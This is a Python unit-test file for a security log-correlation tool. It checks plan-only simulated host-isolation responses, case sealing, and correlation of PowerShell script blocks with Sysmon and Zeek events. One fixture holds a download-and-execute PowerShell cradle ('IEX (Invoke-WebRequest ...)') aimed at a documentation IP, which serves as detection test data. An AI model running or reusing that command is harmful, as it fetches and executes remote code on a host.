
    def test_case_response_register_is_plan_only_and_sealed(
        self,
    ) -> None:
        sysmon = (
            correlation_case_event(
                source_type=(
                    SourceType.SYSMON
                ),
                event_type=(
                    "network_connection"
                ),
                record_index=400,
                event_time_utc=datetime(
                    2026,
                    9,
                    22,
                    12,
                    0,
                    0,
                    tzinfo=timezone.utc,
                ),
                host="HOST-RESPONSE",
                principal=(
                    r"DOMAIN\User1"
                ),
                semantic_fields={
                    "process_name":
                        "powershell.exe",

                    "process_id":
                        "700",

                    "process_guid":
                        "{RESPONSE-GUID}",

                    "src_ip":
                        "10.0.0.50",

                    "src_port":
                        "51000",

                    "dst_ip":
                        "198.51.100.50",

                    "dst_port":
                        "443",

                    "proto":
                        "tcp",

                    "initiated":
                        "true",
                },
            )
        )

        pcap = (
            correlation_case_event(
                source_type=(
                    SourceType.PCAP
                ),
                event_type=(
                    "network_packet"
                ),
                record_index=401,
                event_time_utc=datetime(
                    2026,
                    9,
                    22,
                    12,
                    0,
                    0,
                    250000,
                    tzinfo=timezone.utc,
                ),
                host="",
                principal=None,
                semantic_fields={
                    "src_ip":
                        "10.0.0.50",

                    "src_port":
                        51000,

                    "dst_ip":
                        "198.51.100.50",

                    "dst_port":
                        443,

                    "protocol":
                        "tcp",
                },
            )
        )

        intake = (
            correlation_case_intake(
                sysmon,
                pcap,
            )
        )

        with tempfile.TemporaryDirectory() as temp:
            root = (
                Path(temp)
                / "evidence"
            )

            output = (
                Path(temp)
                / "case-output"
            )

            root.mkdir()

            (
                root
                / "synthetic-correlation-case.xml"
            ).write_bytes(
                b'synthetic bounded correlation case'
            )

            with patch(
                "tracesoc.cli.case."
                "ingest_evidence_directory",
                return_value=intake,
            ):
                result = analyze_case(
                    evidence_directory=root,
                    output_directory=output,
                )

            responses = json.loads(
                (
                    output
                    / "response-register.json"
                ).read_text(
                    encoding="utf-8"
                )
            )[
                "responses"
            ]

            narratives = json.loads(
                (
                    output
                    / "narrative-register.json"
                ).read_text(
                    encoding="utf-8"
                )
            )[
                "narratives"
            ]

            manifest = json.loads(
                (
                    output
                    / "case-manifest.json"
                ).read_text(
                    encoding="utf-8"
                )
            )

            seal = json.loads(
                (
                    output
                    / "case-seal.json"
                ).read_text(
                    encoding="utf-8"
                )
            )

            verification = (
                verify_case_seal(
                    output
                )
            )

        self.assertEqual(
            result[
                "response_count"
            ],
            1,
        )

        self.assertEqual(
            result[
                "narrative_count"
            ],
            1,
        )

        self.assertEqual(
            len(
                responses
            ),
            1,
        )

        self.assertEqual(
            len(
                narratives
            ),
            1,
        )

        response = responses[0]

        self.assertEqual(
            response[
                "action_type"
            ],
            "SIMULATED_HOST_ISOLATION",
        )

        self.assertEqual(
            response[
                "execution_mode"
            ],
            "CASE_PLAN_ONLY",
        )

        self.assertEqual(
            response[
                "execution_status"
            ],
            "NOT_EXECUTED",
        )

        self.assertFalse(
            response[
                "response_actions_executed"
            ]
        )

        self.assertEqual(
            response[
                "target"
            ][
                "host"
            ],
            "HOST-RESPONSE",
        )

        self.assertEqual(
            response[
                "target"
            ][
                "status"
            ],
            "ESTABLISHED",
        )

        self.assertEqual(
            response[
                "target"
            ][
                "asset_owner_status"
            ],
            "NOT_ESTABLISHED",
        )

        self.assertEqual(
            response[
                "target"
            ][
                "current_isolation_state_status"
            ],
            "NOT_ESTABLISHED",
        )

        self.assertEqual(
            response[
                "target"
            ][
                "service_availability_status"
            ],
            "NOT_ESTABLISHED",
        )

        self.assertEqual(
            response[
                "dry_run"
            ][
                "status"
            ],
            "NOT_EXECUTED",
        )

        self.assertFalse(
            response[
                "dry_run"
            ][
                "target_mutated"
            ]
        )

        self.assertEqual(
            response[
                "verification"
            ][
                "status"
            ],
            "NOT_EXECUTED",
        )

        self.assertTrue(
            response[
                "rollback"
            ][
                "required"
            ]
        )

        self.assertTrue(
            response[
                "rollback"
            ][
                "verification_required"
            ]
        )

        self.assertEqual(
            response[
                "sandbox_contract"
            ][
                "lifecycle"
            ],
            [
                "PRECONDITION",
                "DRY_RUN",
                "ACTION",
                "VERIFY",
                "ROLLBACK",
                "VERIFY_ROLLBACK",
            ],
        )

        narrative = narratives[0]

        self.assertEqual(
            narrative[
                "finding_id"
            ],
            response[
                "finding_id"
            ],
        )

        self.assertEqual(
            narrative[
                "corroborated"
            ][
                "evidence_state"
            ],
            "CORROBORATED",
        )

        self.assertEqual(
            narrative[
                "inferred"
            ][
                "claims"
            ],
            [],
        )

        self.assertEqual(
            narrative[
                "not_established"
            ][
                "incident_status"
            ],
            "NOT_ESTABLISHED",
        )

        self.assertEqual(
            narrative[
                "not_established"
            ][
                "malicious_intent_status"
            ],
            "NOT_ESTABLISHED",
        )

        self.assertTrue(
            narrative[
                "citation_summary"
            ][
                "supporting_relationship_ids"
            ]
        )

        self.assertTrue(
            narrative[
                "citation_summary"
            ][
                "observation_ids"
            ]
        )

        self.assertTrue(
            narrative[
                "citation_summary"
            ][
                "raw_locators_present"
            ]
        )

        for observation in narrative[
            "observed"
        ][
            "observations"
        ]:
            self.assertEqual(
                observation[
                    "evidence_state"
                ],
                "OBSERVED",
            )

            self.assertTrue(
                observation[
                    "raw_locator"
                ][
                    "logical_source"
                ]
            )

        self.assertEqual(
            manifest[
                "analysis_counts"
            ][
                "response_records"
            ],
            1,
        )

        self.assertEqual(
            manifest[
                "analysis_counts"
            ][
                "narrative_records"
            ],
            1,
        )

        self.assertFalse(
            manifest[
                "narrative_boundary"
            ][
                "additional_inference_introduced"
            ]
        )

        self.assertFalse(
            manifest[
                "narrative_boundary"
            ][
                "incident_declared"
            ]
        )

        self.assertFalse(
            manifest[
                "narrative_boundary"
            ][
                "malicious_intent_established"
            ]
        )

        self.assertTrue(
            manifest[
                "response_boundary"
            ][
                "plan_only"
            ]
        )

        self.assertFalse(
            manifest[
                "response_boundary"
            ][
                "response_actions_executed"
            ]
        )

        self.assertFalse(
            manifest[
                "response_boundary"
            ][
                "target_state_fabricated"
            ]
        )

        self.assertFalse(
            manifest[
                "response_boundary"
            ][
                "asset_owner_fabricated"
            ]
        )

        self.assertFalse(
            manifest[
                "response_boundary"
            ][
                "service_availability_fabricated"
            ]
        )

        sealed_paths = {
            item[
                "path"
            ]
            for item
            in seal[
                "files"
            ]
        }

        self.assertIn(
            "response-register.json",
            sealed_paths,
        )

        self.assertIn(
            "narrative-register.json",
            sealed_paths,
        )

        self.assertTrue(
            verification[
                "seal_verified"
            ]
        )


import hashlib
from datetime import timedelta

from tracesoc.cli.case import (
    _evaluate_case_correlations,
)

from tracesoc.normalization.powershell_scriptblock import (
    PowerShellScriptBlock,
    ScriptBlockFragment,
    ScriptBlockState,
)


class SourceNativeCorrelationV2CaseTests(
    unittest.TestCase
):
    def _fixture(
        self,
        *,
        sysmon_process_id: str = "500",
        zeek_destination_ip: str = (
            "198.51.100.20"
        ),
    ):
        powershell_time = datetime(
            2026,
            9,
            22,
            12,
            0,
            0,
            tzinfo=timezone.utc,
        )

        sysmon = correlation_case_event(
            source_type=(
                SourceType.SYSMON
            ),
            event_type=(
                "process_create"
            ),
            record_index=900,
            event_time_utc=(
                powershell_time
                - timedelta(
                    seconds=10
                )
            ),
            host="HOST-RAW",
            principal=(
                r"DOMAIN\User1"
            ),
            semantic_fields={
                "process_name": (
                    r"C:\Windows\System32\WindowsPowerShell"
                    r"\v1.0\powershell.exe"
                ),
                "process_id":
                    sysmon_process_id,
            },
        )

        powershell = correlation_case_event(
            source_type=(
                SourceType.POWERSHELL
            ),
            event_type=(
                "powershell_event"
            ),
            record_index=901,
            event_time_utc=(
                powershell_time
            ),
            host="HOST-RAW",
            principal=None,
            semantic_fields={},
        )

        zeek = correlation_case_event(
            source_type=(
                SourceType.ZEEK
            ),
            event_type=(
                "network_connection"
            ),
            record_index=902,
            event_time_utc=(
                powershell_time
                + timedelta(
                    seconds=10
                )
            ),
            host="",
            principal=None,
            semantic_fields={
                "src_ip":
                    "10.0.0.5",
                "dst_ip":
                    zeek_destination_ip,
                "dst_port":
                    8080,
            },
        )

        script_text = (
            "IEX (Invoke-WebRequest "
            "http://198.51.100.20:8080/a).Content"
        )

        block = PowerShellScriptBlock(
            reconstruction_id=(
                "psb_source_native_test"
            ),
            script_block_id=(
                "source-native-block"
            ),
            state=(
                ScriptBlockState.COMPLETE
            ),
            host="HOST-RAW",
            process_id="500",
            thread_id="700",
            security_user_id=(
                "S-1-5-21-1000"
            ),
            path=None,
            expected_message_total=1,
            observed_message_numbers=(
                1,
            ),
            missing_message_numbers=(),
            parent_event_ids=(
                powershell.event_id,
            ),
            fragments=(
                ScriptBlockFragment(
                    source_event_id=(
                        powershell.event_id
                    ),
                    message_number=1,
                    script_text=(
                        script_text
                    ),
                    event_time_utc=(
                        powershell_time
                    ),
                ),
            ),
            first_event_time_utc=(
                powershell_time
            ),
            last_event_time_utc=(
                powershell_time
            ),
            script_text=(
                script_text
            ),
            script_text_sha256=(
                hashlib.sha256(
                    script_text.encode(
                        "utf-8"
                    )
                ).hexdigest()
            ),
        )

        return (
            sysmon,
            powershell,
            zeek,
            block,
        )

    def test_source_native_reconstruction_reaches_corr001_and_corr002(
        self,
    ) -> None:
        (
            sysmon,
            powershell,
            zeek,
            block,
        ) = self._fixture()

        (
            records,
            projections,
            candidates,
        ) = _evaluate_case_correlations(
            (
                sysmon,
                powershell,
                zeek,
            ),
            script_blocks=(
                block,
            ),
        )

        self.assertEqual(
            {
                item[
                    "correlation_id"
                ]
                for item
                in records
            },
            {
                "TRC-CORR-001",
                "TRC-CORR-002",
            },
        )

        self.assertTrue(
            all(
                item[
                    "matched"
                ]
                for item
                in records
            )
        )

        self.assertEqual(
            {
                item[
                    "correlation_version"
                ]
                for item
                in records
            },
            {
                "2.0.0",
            },
        )

        self.assertEqual(
            len(
                projections
            ),
            2,
        )

        self.assertEqual(
            len(
                candidates
            ),
            2,
        )

        anchors_by_id = {
            projection.legacy_correlation_id:
                {
                    (
                        anchor.anchor_type,
                        anchor.value,
                        anchor.temporal,
                    )
                    for anchor
                    in (
                        projection
                        .relationship
                        .anchors
                    )
                }
            for projection
            in projections
        }

        self.assertIn(
            (
                "script_uri_destination_ip",
                "198.51.100.20",
                False,
            ),
            anchors_by_id[
                "TRC-CORR-001"
            ],
        )

        self.assertIn(
            (
                "script_uri_destination_port",
                "8080",
                False,
            ),
            anchors_by_id[
                "TRC-CORR-001"
            ],
        )

        self.assertNotIn(
            (
                "source_ip",
                "10.0.0.5",
                False,
            ),
            anchors_by_id[
                "TRC-CORR-001"
            ],
        )

        self.assertIn(
            (
                "host",
                "host-raw",
                False,
            ),
            anchors_by_id[
                "TRC-CORR-002"
            ],
        )

        self.assertIn(
            (
                "process_id",
                "500",
                False,
            ),
            anchors_by_id[
                "TRC-CORR-002"
            ],
        )

    def test_source_native_anchor_mismatches_fail_closed(
        self,
    ) -> None:
        (
            sysmon,
            powershell,
            zeek,
            block,
        ) = self._fixture(
            sysmon_process_id=(
                "999"
            ),
            zeek_destination_ip=(
                "203.0.113.77"
            ),
        )

        (
            records,
            projections,
            candidates,
        ) = _evaluate_case_correlations(
            (
                sysmon,
                powershell,
                zeek,
            ),
            script_blocks=(
                block,
            ),
        )

        self.assertEqual(
            {
                item[
                    "reason_code"
                ]
                for item
                in records
            },
            {
                "destination_ip_mismatch",
                "process_id_mismatch",
            },
        )

        self.assertTrue(
            all(
                not item[
                    "matched"
                ]
                for item
                in records
            )
        )

        self.assertEqual(
            projections,
            (),
        )

        self.assertEqual(
            candidates,
            (),
        )


if __name__ == "__main__":
    unittest.main()
